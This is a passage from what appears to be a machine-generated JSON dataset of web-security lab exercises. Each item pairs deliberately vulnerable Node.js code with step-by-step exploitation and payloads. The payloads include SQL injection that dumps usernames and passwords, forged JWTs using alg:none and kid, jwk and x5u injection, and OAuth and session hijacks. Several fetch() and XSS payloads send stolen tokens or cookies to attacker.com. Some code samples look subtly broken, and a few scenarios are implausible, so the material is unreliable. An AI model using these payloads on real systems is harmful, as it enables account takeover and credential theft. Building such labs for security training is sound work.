    "Lab Description": "The IoT dashboard allows users to filter devices by status, but the query is vulnerable in the HAVING clause. To solve: Exploit the HAVING clause to retrieve unauthorized user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter devices endpoint.",
      "Inject SQL payloads into the 'status' parameter, such as 'active' HAVING 1=1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-devices', (req, res) => {\n  const status = req.query.status;\n  const query = `SELECT * FROM devices HAVING status = '${status}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "active' HAVING 1=1 UNION SELECT username, password FROM users--",
      "active' HAVING 1=1 UNION SELECT id, password FROM users--",
      "active' HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in SELECT Clause",
    "Lab Description": "The API Gateway allows filtering products by name, but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the filter products endpoint.",
      "Inject SQL payloads into the 'name' parameter, such as 'laptop' UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-products', (req, res) => {\n  const name = req.query.name;\n  const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "laptop' UNION SELECT username, password FROM users--",
      "laptop' UNION SELECT id, password FROM users--",
      "laptop' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "This lab's JWT implementation fails to properly verify the token signature. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT token using Burp Suite while logged in as a low-privilege user",
      "Decode the token using jwt.io or Burp Decoder to analyze its structure",
      "Modify the token by changing the alg header to 'none' and adding admin:true to the payload",
      "Remove the signature portion (set to empty string) and send the modified token",
      "Verify admin access by accessing /admin/dashboard endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin/dashboard', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  if (decoded.header.alg === 'none') {\n    const payload = decoded.payload;\n    if (payload.admin) {\n      return res.send('Admin dashboard accessed');\n    }\n  }\n  res.status(403).send('Access denied');\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJhZG1pbiI6dHJ1ZX0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWV9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
    "Lab Description": "This lab's OAuth implementation fails to validate redirect_uri parameters properly. The application leaks authorization codes to arbitrary domains. To solve: steal an OAuth token by manipulating the redirect flow to your attacker server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the OAuth authorization endpoint using OWASP ZAP",
      "Intercept the initial OAuth flow and modify the redirect_uri parameter to point to your attacker server",
      "Set up a netcat listener on your server to capture incoming requests",
      "Trick the victim into initiating the OAuth flow (or use an existing session)",
      "Capture the authorization code from your server logs and exchange it for an access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const code = 'RANDOM_CODE_' + Math.random().toString(36).substring(2);\n  return res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const { code, client_secret } = req.body;\n  if (code.startsWith('RANDOM_CODE_')) {\n    return res.json({ access_token: 'SECRET_ACCESS_TOKEN' });\n  }\n  res.status(400).json({ error: 'Invalid code' });\n});\napp.listen(3000);",
    "payloads": [
      "https://attacker.com/callback?code=STOLEN_CODE&state=123",
      "http://evil.com/steal?auth_code=LEAKED_TOKEN"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL mutation",
    "Lab Description": "This lab's GraphQL endpoint allows session fixation attacks through a vulnerable mutation. The application assigns session tokens based on client-provided values. To solve: fixate a session token and trick an admin into using it to gain privileged access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to explore the GraphQL API and identify the vulnerable mutation",
      "Craft a GraphQL request to set a custom session token via the Set-Cookie header",
      "Embed the fixed session token in a CSRF payload targeting admin users",
      "Trigger the admin's browser to make requests with your fixed session",
      "Verify compromise by accessing privileged endpoints with the fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst schema = buildSchema(`\n  type Mutation {\n    setSessionToken(token: String!): String\n  }\n`);\nconst root = {\n  setSessionToken: ({ token }) => {\n    this.token = token;\n    return token;\n  }\n};\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\napp.get('/admin', (req, res) => {\n  if (req.cookies.session === root.token) {\n    return res.send('Admin privileges granted');\n  }\n  res.status(403).send('Access denied');\n});\napp.listen(3000);",
    "payloads": [
      "mutation { setSessionToken(token: \"FIXED_SESSION_123\") }",
      "{\"query\":\"mutation { setSessionToken(token: \\\"HACKED_SESSION_456\\\") }\"}"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "This lab's JWT verification microservice improperly validates the kid header parameter. The application allows directory traversal in the key file lookup. To solve: forge a valid admin token by forcing the server to use your malicious public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and decode it to analyze the kid header",
      "Craft a token with kid header set to '../../attacker-controlled/key.pub'",
      "Generate a matching RSA key pair using OpenSSL on your attacker server",
      "Host the public key at the predictable location referenced in the kid header",
      "Submit the forged token to /admin-api endpoint and verify privileged access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\napp.get('/verify-token', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  const keyPath = `/keys/${decoded.header.kid}`;\n  const pubKey = fs.readFileSync(keyPath);\n  try {\n    const payload = jwt.verify(token, pubKey);\n    res.json({ valid: true, user: payload.user });\n  } catch (e) {\n    res.status(403).json({ error: 'Invalid token' });\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uL2F0dGFja2VyL2tleS5wdWIifQ.eyJ1c2VyIjoiYWRtaW4ifQ.FAKE_SIGNATURE",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uL3RtcC9tYWxpY2lvdXMucHViIn0.eyJ1c2VyIjoicm9vdCJ9.XFAKE_SIG"
    ]
  },
  {
    "Lab scenario": "Session swapping via GraphQL batch mutation",
    "Lab Description": "This lab's GraphQL endpoint processes batch mutations with session state conflicts. The application fails to isolate session contexts between parallel operations. To solve: execute a batch mutation that swaps your session ID with an admin's active session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to explore the GraphQL API and identify the session management mutations",
      "Craft a batch mutation containing both getSession(id: ADMIN_ID) and setSession(token: YOUR_TOKEN)",
      "Structure the operations to force session state collision using GraphQL aliases",
      "Execute the batch request and verify session takeover via the /whoami endpoint",
      "Access admin-only resources using the hijacked session context"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst schema = buildSchema(`\n  type Mutation {\n    setSession(token: String!): String\n    getSession(id: ID!): Session\n  }\n  type Session {\n    token: String\n    user: User\n  }\n`);\nlet activeSessions = {};\nconst root = {\n  setSession: ({ token }) => {\n    activeSessions[token] = { user: 'attacker' };\n    return token;\n  },\n  getSession: ({ id }) => {\n    return activeSessions[id];\n  }\n};\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root\n}));\napp.listen(3000);",
    "payloads": [
      "[{\"query\":\"mutation { op1: setSession(token: \\\"ADMIN_SESSION\\\") op2: getSession(id: \\\"MY_SESSION\\\") { token } }\"}]",
      "{\"query\":\"mutation BatchSwap { a:setSession(token: \\\"LEGIT_TOKEN\\\") b:getSession(id: \\\"ADMIN_TOKEN\\\") { user } }\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token hijack via insecure PKCE implementation",
    "Lab Description": "This lab's OAuth flow implements PKCE security incorrectly. The application fails to bind the code_verifier to the authorization request. To solve: intercept an authorization code and redeem it without knowing the original code_challenge.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the OAuth initiation request using OWASP ZAP and note the code_challenge",
      "Allow the victim to complete the authorization flow and capture the redirect with auth code",
      "Craft a token request omitting the code_verifier parameter entirely",
      "Alternatively, brute-force the code_verifier using hashcat rules",
      "Exchange the stolen authorization code for an access token and access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\nlet authCodes = {};\napp.get('/oauth/authorize', (req, res) => {\n  const challenge = req.query.code_challenge;\n  const code = crypto.randomBytes(16).toString('hex');\n  authCodes[code] = { challenge, valid: true };\n  res.redirect(`${req.query.redirect_uri}?code=${code}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.body;\n  if (authCodes[code]?.valid) {\n    delete authCodes[code];\n    return res.json({ access_token: 'LEAKED_TOKEN' });\n  }\n  res.status(400).json({ error: 'Invalid code' });\n});\napp.listen(3000);",
    "payloads": [
      "POST /oauth/token?code=STOLEN_CODE&client_id=CLIENT&grant_type=authorization_code",
      "POST /oauth/token {\"code\":\"HIJACKED_CODE\",\"grant_type\":\"authorization_code\",\"client_id\":\"VULN_CLIENT\"}"
    ]
  },
  {
    "Lab scenario": "JWT signature stripping via HTTP method tampering in REST API",
    "Lab Description": "This lab's JWT validation endpoint is vulnerable to HTTP method manipulation. The application fails to verify signatures on HEAD requests while still returning privileged data. To solve: extract admin credentials by bypassing signature validation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT request using Burp Suite and change the method from GET to HEAD",
      "Observe the server returns user data without signature validation",
      "Modify the JWT payload to include admin claims while keeping the original signature",
      "Resend the modified token via HEAD request to extract sensitive data",
      "Verify admin access by using extracted credentials on /admin portal"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.head('/api/user', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  res.set('X-User-Data', JSON.stringify(decoded.payload));\n  res.end();\n});\napp.get('/api/user', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  jwt.verify(token, 'secretkey', (err, decoded) => {\n    if (err) return res.status(403).send('Invalid token');\n    res.json(decoded);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "HEAD /api/user HTTP/1.1\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.FAKE_SIGNATURE",
      "HEAD /api/user HTTP/1.1\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS in SPA authentication",
    "Lab Description": "This lab's Single Page Application implements OAuth with overly permissive CORS headers. The application exposes access tokens to arbitrary origins through insecure response headers. To solve: craft a malicious website that steals OAuth tokens through cross-origin requests.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP and note the Access-Control-Allow-Origin header",
      "Create an attacker page with XMLHttpRequest to the OAuth callback endpoint",
      "Host the page on a different domain and trick the victim into visiting it",
      "Capture the OAuth token in the JavaScript response handler",
      "Use the stolen token to authenticate as the victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\napp.use(cors({\n  origin: true,\n  credentials: true\n}));\napp.get('/oauth/callback', (req, res) => {\n  res.json({\n    access_token: 's3cret_t0ken',\n    token_type: 'bearer'\n  });\n});\napp.listen(3000);",
    "payloads": [
      "fetch('https://vulnerable.com/oauth/callback')\n  .then(res => res.json())\n  .then(token => {\n    fetch('https://attacker.com/steal?token='+token.access_token)\n  });",
      "var xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://vulnerable.com/oauth/callback');\nxhr.withCredentials = true;\nxhr.onload = function() {\n  document.location='https://attacker.com/steal?data='+xhr.responseText;\n};\nxhr.send();"
    ]
  },
  {
    "Lab scenario": "Session fixation through GraphQL websocket subscriptions",
    "Lab Description": "This lab's GraphQL over WebSocket implementation is vulnerable to session fixation during subscription initialization. The application accepts session identifiers from unauthenticated websocket connections. To solve: establish a websocket connection with a fixed session ID and trick an admin into using it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to establish a GraphQL websocket connection and analyze the handshake",
      "Inject a custom session_id parameter during the connection_init phase",
      "Maintain the websocket connection while the session remains valid",
      "Social engineer an admin to log in while monitoring your active connection",
      "Execute privileged GraphQL operations through the hijacked session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebSocketServer } = require('ws');\nconst wss = new WebSocketServer({ port: 3000 });\nlet activeSessions = {};\nwss.on('connection', (ws) => {\n  ws.on('message', (data) => {\n    const msg = JSON.parse(data);\n    if (msg.type === 'connection_init') {\n      activeSessions[msg.payload.session_id] = ws;\n      ws.sessionId = msg.payload.session_id;\n    }\n  });\n});",
    "payloads": [
      "{\"type\":\"connection_init\",\"payload\":{\"session_id\":\"FIXED_SESSION_123\"}}",
      "{\"id\":\"1\",\"type\":\"start\",\"payload\":{\"query\":\"subscription { adminData }\",\"session_id\":\"HIJACKED_SESSION\"}}"
    ]
  },
  {
    "Lab scenario": "JWT claim injection via nested JSON parsing in REST API",
    "Lab Description": "This lab's JWT implementation improperly handles nested JSON objects in claims. The application fails to validate claim structures when using the 'none' algorithm. To solve: escalate privileges by injecting nested admin claims into a valid token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and decode its structure",
      "Craft a token with alg:none containing nested JSON objects in the payload",
      "Inject {'user':{'isAdmin':true}} into the claims while removing the signature",
      "Verify token acceptance by submitting to /api/privileged-action endpoint",
      "Access admin dashboard with the forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.post('/api/verify', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {json: true, complete: true});\n  if (decoded.header.alg === 'none') {\n    if (decoded.payload?.user?.isAdmin) {\n      return res.json({access: 'granted'});\n    }\n  }\n  res.status(403).json({error: 'Access denied'});\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjp7ImlzQWRtaW4iOnRydWV9fQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJjbGFpbXMiOnsiYWNjZXNzIjoid3JpdGUiLCJ1c2VyIjp7InJvbGUiOiJhZG1pbiJ9fX0."
    ]
  },
  {
    "Lab scenario": "OAuth token hijack via state parameter reflection",
    "Lab Description": "This lab's OAuth implementation reflects the state parameter without validation. The application echoes the state value in the redirect URL after authentication. To solve: craft a malicious state value that executes XSS when reflected to steal tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow using OWASP ZAP and observe state parameter handling",
      "Craft a state parameter containing JavaScript payload: <script>fetch('https://attacker.com/steal?token='+document.location.hash)</script>",
      "Trick victim into initiating authentication with malicious state value",
      "Capture the access token when victim's browser executes the XSS payload",
      "Use stolen token to authenticate as victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/oauth/callback', (req, res) => {\n  const state = req.query.state;\n  const token = 'generated_token_' + Math.random().toString(36).substring(2);\n  res.redirect(`${req.query.redirect_uri}#token=${token}&state=${encodeURIComponent(state)}`);\n});\napp.listen(3000);",
    "payloads": [
      "/oauth/authorize?client_id=victim&state=<script>alert(document.cookie)</script>",
      "/oauth/authorize?response_type=code&state=%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27https%3A%2F%2Fattacker.com%2Fsteal%3F%27%2Bdocument.cookie%29%22%3E"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 header compression in REST API",
    "Lab Description": "This lab's session management is vulnerable to HPACK compression attacks in HTTP/2. The application accepts session IDs from compressed headers without proper validation. To solve: fixate a session ID by manipulating header compression and trick an admin into using it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture HTTP/2 traffic using Burp Suite with HTTP/2 and HTTP/History enabled",
      "Analyze header compression patterns for Set-Cookie responses",
      "Craft multiple requests with specially crafted headers to manipulate HPACK state",
      "Force the server to reuse your session ID for admin's Set-Cookie header",
      "Verify session takeover by accessing privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst server = http2.createServer();\nlet sessions = {};\nserver.on('stream', (stream, headers) => {\n  if (!headers['cookie']) {\n    const sessionId = 'sess_' + Math.random().toString(36).substring(2);\n    sessions[sessionId] = {user: 'guest'};\n    stream.respond({\n      ':status': 200,\n      'set-cookie': `session=${sessionId}`,\n      'content-type': 'text/html'\n    });\n    stream.end('Session set');\n  } else {\n    const sessionId = headers['cookie'].split('=')[1];\n    stream.respond({\n      ':status': 200,\n      'content-type': 'text/html'\n    });\n    stream.end(`Current user: ${sessions[sessionId]?.user || 'none'}`);\n  }\n});\nserver.listen(3000);",
    "payloads": [
      "GET / HTTP/2\nHost: vulnerable.com\ncustom-header: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      "GET / HTTP/2\nHost: vulnerable.com\ncustom-header: X\ncookie: session=FIXED_SESSION_ID"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via JWK header injection in REST API",
    "Lab Description": "This lab's JWT implementation is vulnerable to algorithm confusion attacks through JWK header injection. The application verifies tokens using different algorithms based on the provided JWK header. To solve: forge a valid admin token by forcing the server to use a public key you control.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and analyze its structure",
      "Generate a RSA key pair using OpenSSL and host the public key on your server",
      "Craft a token with alg:RS256 and a jwk header pointing to your public key",
      "Modify the payload to include admin privileges while signing with your private key",
      "Submit the forged token to /admin-api endpoint and verify privileged access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\napp.post('/verify-token', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  if (decoded.header.jwk) {\n    const key = {kty: 'RSA', e: decoded.header.jwk.e, n: decoded.header.jwk.n};\n    jwt.verify(token, key, {algorithms: ['RS256']}, (err, payload) => {\n      if (!err && payload.admin) res.json({access: 'granted'});\n      else res.status(403).json({error: 'Access denied'});\n    });\n  } else {\n    jwt.verify(token, 'HMAC_SECRET', (err, payload) => {\n      if (!err) res.json({access: 'partial'});\n      else res.status(403).json({error: 'Access denied'});\n    });\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoicHVibGljLWtleS1uIiwiZSI6IkFRQUIifX0.eyJhZG1pbiI6dHJ1ZX0.SIGNATURE",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJlIjoiQVFBQiIsImt0eSI6IlJTQSIsIm4iOiJtYWxpY2lvdXMta2V5In19.eyJ1c2VyIjoiYWRtaW4ifQ.FAKE_SIG"
    ]
  },
  {
    "Lab scenario": "OAuth token theft via OpenID configuration hijacking",
    "Lab Description": "This lab's OAuth implementation dynamically loads OpenID configuration from an unverified location. The application follows redirects when fetching the OpenID configuration. To solve: hijack the configuration endpoint to point to your malicious server and steal authorization codes.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OpenID configuration request",
      "Set up a malicious OpenID configuration server that points token_endpoint to your attacker server",
      "Use DNS poisoning or MITM to redirect configuration requests to your server",
      "Capture authorization codes when victims authenticate",
      "Exchange codes for tokens at your fake token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\napp.get('/.well-known/openid-configuration', (req, res) => {\n  const config = {\n    issuer: 'https://vulnerable-oauth.com',\n    token_endpoint: 'https://attacker.com/token'\n  };\n  res.json(config);\n});\napp.get('/auth', async (req, res) => {\n  const config = await axios.get(req.query.config_url);\n  const token = await axios.post(config.data.token_endpoint);\n  res.json({user: 'authenticated'});\n});\napp.listen(3000);",
    "payloads": [
      "GET /.well-known/openid-configuration HTTP/1.1\nHost: attacker.com",
      "/auth?config_url=http://attacker.com/.well-known/openid-configuration"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket connection ID reuse",
    "Lab Description": "This lab's real-time API assigns session tokens based on WebSocket connection IDs. The application reuses connection IDs when connections are dropped unexpectedly. To solve: force a connection drop and predict the next connection ID to fixate a session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to establish a WebSocket connection and note the connection ID",
      "Abruptly disconnect and immediately reconnect while monitoring network traffic",
      "Analyze connection ID generation pattern using Burp Suite",
      "Predict the next connection ID and use it to establish a session",
      "Trick an admin into authenticating with your fixated connection ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 3000 });\nlet lastConnectionId = 1000;\nwss.on('connection', (ws) => {\n  ws.connectionId = ++lastConnectionId;\n  ws.on('message', (message) => {\n    if (message === 'AUTH') {\n      ws.sessionId = `sess_${ws.connectionId}`;\n      ws.send('AUTH_OK');\n    }\n  });\n  ws.on('close', () => {\n    lastConnectionId = ws.connectionId;\n  });\n});",
    "payloads": [
      "{\"type\":\"connect\",\"connection_id\":\"PREDICTED_ID\"}",
      "AUTH\nconnection_id:PREDICTED_ID"
    ]
  },
  {
    "Lab scenario": "JWT public key injection via x5u header in microservice authentication",
    "Lab Description": "This lab's JWT validation service improperly processes x5u headers that reference external X.509 certificates. The application fails to validate certificate sources when verifying signatures. To solve: forge an admin token by injecting your own certificate chain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and analyze the headers",
      "Generate a self-signed certificate chain using OpenSSL",
      "Host the certificate chain on your attacker-controlled server",
      "Craft a token with x5u header pointing to your certificate and admin claims",
      "Submit the forged token to /admin endpoint and verify privileged access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\napp.post('/verify', async (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  if (decoded.header.x5u) {\n    try {\n      const cert = await axios.get(decoded.header.x5u);\n      jwt.verify(token, cert.data, (err, payload) => {\n        if (!err && payload.admin) res.json({access: 'granted'});\n        else res.status(403).json({error: 'Invalid token'});\n      });\n    } catch (e) {\n      res.status(400).json({error: 'Certificate fetch failed'});\n    }\n  } else {\n    jwt.verify(token, 'SECRET_KEY', (err) => {\n      if (err) res.status(403).json({error: 'Invalid token'});\n      else res.json({access: 'partial'});\n    });\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQucGVtIn0.eyJhZG1pbiI6dHJ1ZX0.SIGNATURE",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9ldmlsL2NlcnQifQ.eyJ1c2VyIjoiYWRtaW4ifQ.FAKE_SIG"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe in response_mode=form_post",
    "Lab Description": "This lab's OAuth implementation uses response_mode=form_post with insufficient frame busting. The application renders the token submission form in a way that allows iframe embedding. To solve: create a malicious page that loads the OAuth callback in an iframe to intercept the token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow using OWASP ZAP and observe response_mode behavior",
      "Create an attacker page with <iframe src='https://victim.com/oauth/callback?code=VALID_CODE&state=123'>",
      "Add JavaScript to monitor iframe contents for token submission",
      "Trick victim into visiting your malicious page during OAuth flow",
      "Capture the token when the form auto-submits in the iframe"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.set('view engine', 'ejs');\napp.get('/oauth/callback', (req, res) => {\n  res.render('token_post', {\n    token: 'generated_token',\n    client_id: req.query.client_id\n  });\n});\napp.listen(3000);",
    "payloads": [
      "<iframe id=\"stealer\" src=\"https://vulnerable.com/oauth/callback?code=STOLEN_CODE\"></iframe>\n<script>\n  window.addEventListener('message', (e) => {\n    if(e.data.token) fetch('https://attacker.com/steal?token='+e.data.token);\n  });\n</script>",
      "<object data=\"https://vulnerable.com/oauth/callback?code=LEAKED_CODE\"></object>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 trailer headers in REST API",
    "Lab Description": "This lab's session management is vulnerable to trailer header injection in HTTP/2. The application processes Set-Cookie headers from trailers after the request body. To solve: craft a request with malicious trailer headers to fixate a session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture HTTP/2 traffic using Burp Suite with 'Allow HTTP/2 ALPN override' enabled",
      "Craft a POST request with 'Trailer: Set-Cookie' header and chunked encoding",
      "Include your session ID in the trailer headers of the request",
      "Verify session fixation by checking the Set-Cookie response",
      "Trick an admin into authenticating while your session ID remains active"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst fs = require('fs');\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n});\nserver.on('stream', (stream, headers) => {\n  let data = '';\n  stream.on('data', (chunk) => { data += chunk; });\n  stream.on('end', () => {\n    if (headers['trailer']) {\n      stream.on('trailers', (trailers) => {\n        if (trailers['set-cookie']) {\n          stream.respond({\n            ':status': 200,\n            'content-type': 'text/plain'\n          });\n          stream.end('Session set');\n        }\n      });\n    }\n  });\n});\nserver.listen(3000);",
    "payloads": [
      "POST / HTTP/2\nHost: vulnerable.com\nTrailer: Set-Cookie\nTransfer-Encoding: chunked\n\n0\nSet-Cookie: session=FIXATED_ID",
      "POST /api HTTP/2\nHost: target.com\nTe: trailers\nTrailer: Cookie\n\n0\nCookie: session=HIJACKED_SESSION"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The lab's JWT implementation fails to validate the algorithm properly. The application accepts unsigned tokens when alg:none is specified. To solve: forge a valid admin token by modifying your JWT without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid user session request with Burp Suite to capture the JWT",
      "Decode the JWT using jwt.io or Burp Decoder to analyze its structure",
      "Modify the algorithm header to 'none' and change the role to 'admin'",
      "Remove the signature portion of the JWT (after the last dot)",
      "Submit the modified token in Authorization header to access admin panel"
    ],
    "Vulnerability name": "Authentication",
